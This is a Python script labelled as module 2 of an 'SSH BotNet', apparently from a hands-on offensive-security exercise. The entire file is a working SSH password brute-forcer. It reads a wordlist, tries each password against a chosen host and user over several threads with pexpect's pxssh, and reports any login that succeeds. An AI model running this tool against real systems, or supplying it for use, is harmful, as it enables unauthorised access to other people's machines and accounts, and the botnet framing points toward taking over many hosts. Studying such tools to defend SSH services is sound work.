#!/usr/bin/python3

"""
A SSH BotNet
Module 2 - Interacting to SSH through pxssh and bruteforcing the passwords
"""

import optparse
import time
from threading import *
from pexpect import pxssh

max_connections = 5
connection_lock = BoundedSemaphore(value = max_connections)
Found           = False
Fails           = 0


def connect( host, user, password, release ):
    global Found
    global Fails
    
    try:
        s = pxssh.pxssh()
        s.login( host, user, password)
        print("[+] Password found ==> "+password)
        Found = True
    except Exception as e:
        if( "read_nonblocking" in str(e) ):
            Fails += 1
            time.sleep(5)
            connect( host, user, password, False )
        elif( "synchronize with original prompt" in str(e) ):
            time.sleep(1)
            connect( host, user, password, False )
    finally:
        if(release):
            connection_lock.release()


def main():
    parser = optparse.OptionParser(usage = "Usage : ./SSHBrute.py -H <host> -u <user> -w <wordlist>")
    parser.add_option("-H", dest = 'tgthost', type = str, help = "Specify target to attack")
    parser.add_option("-u", dest = 'user', type = str, help = "Specify the user")
    parser.add_option("-w", dest = 'passfile', type = str, help = "Dictionary ro use")
    options,args = parser.parse_args()
    
    host     = options.tgthost
    user     = options.user
    passfile = options.passfile
    
    if( host == None or passfile == None or user == None ):
        print(parser.usage())
        exit(0)
    
    with open(passfile,'r') as passwords:
        for passwd in passwords.readlines():
            if( Found ):
                print("[+] Exiting Password Found ! ==> "+passwd)
                exit(0)
            if( Fails > 5 ):
                print("[!] Exiting Too many Timeouts")
                exit(0)
            connection_lock.acquire()
            passwd = passwd.strip('\r').strip('\n')
            print("[*] Testing Pass : "+passwd)
            t     = Thread( target = connect, args = (host, user, passwd, True) )
            child = t.start()


if( __name__ == '__main__' ):
    main()
